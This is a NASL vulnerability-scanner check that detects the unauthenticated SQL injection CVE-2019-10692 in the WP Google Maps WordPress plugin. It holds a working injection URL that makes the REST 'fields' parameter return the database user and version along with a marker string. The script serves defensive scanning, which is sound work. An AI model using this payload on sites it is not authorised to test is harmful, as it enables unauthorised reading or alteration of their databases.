#
# (C) WebRAY Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(123643);
  script_version("1.2");
  script_cvs_date("Date: 2019/04/03 16:56:05");

  script_cve_id("CVE-2019-10692");

  script_name(english:"WP Google Maps for WordPress < 7.11.17 Unauthenticated SQL Injection (CVE-2019-10692)");
  script_summary(english:"Checks for vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected
by an unauthenticated SQL injection vulnerability.");

  script_set_attribute(attribute:"description", value:
"The WP Google Maps plugin for WordPress running on the remote web
server is affected by an SQL injection (SQLi) vulnerability due to
improper validation of user-supplied input. An unauthenticated,
remote attacker can exploit this to inject or manipulate SQL queries
in the back-end database, resulting in the disclosure or manipulation
of arbitrary data.");
  script_set_attribute(attribute:"see_also", value:"https://wpvulndb.com/vulnerabilities/9249");
  script_set_attribute(attribute:"see_also", value:"https://wordpress.org/plugins/wp-google-maps/");
  script_set_attribute(attribute:"solution", value:
"Upgrade the WP Google Maps plugin for WordPress to version
7.11.18 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-10692");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/04/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/04/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/04/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_GizaNE", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019 and is owned by WebRAY, Inc. or an Affiliate thereof.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");
include("misc_func.inc");
include("data_protection.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(app_name:app, port:port);

dir = install["path"];
install_url = build_url(port:port, qs:dir);

url = install_url + '/index.php?rest_route=/wpgmza/v1/markers/&filter=%7B%22GizaNE%22%3Atrue%7D&fields=user%28%29%20as%20user%5Fhostname%2Cversion%28%29%20as%20mysql%5Fversion%2Csysdate%28%29%20as%20GizaNE%5Fwas%5Fhere';

plugin_name = "WP Google Maps";

res = http_send_recv3(
  method:"GET",
  port:port,
  item:url,
  exit_on_fail:TRUE
);

output = data_protection::sanitize_user_full_redaction(output:res[2]);

if ("GizaNE_was_here" >< res[2])
{
  security_report_v4(
    port:port,
    severity:SECURITY_HOLE,
    request:make_list(http_last_sent_request()),
    output:output,
    generic:TRUE,
    sqli:TRUE
  );
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin_name + ' plugin');
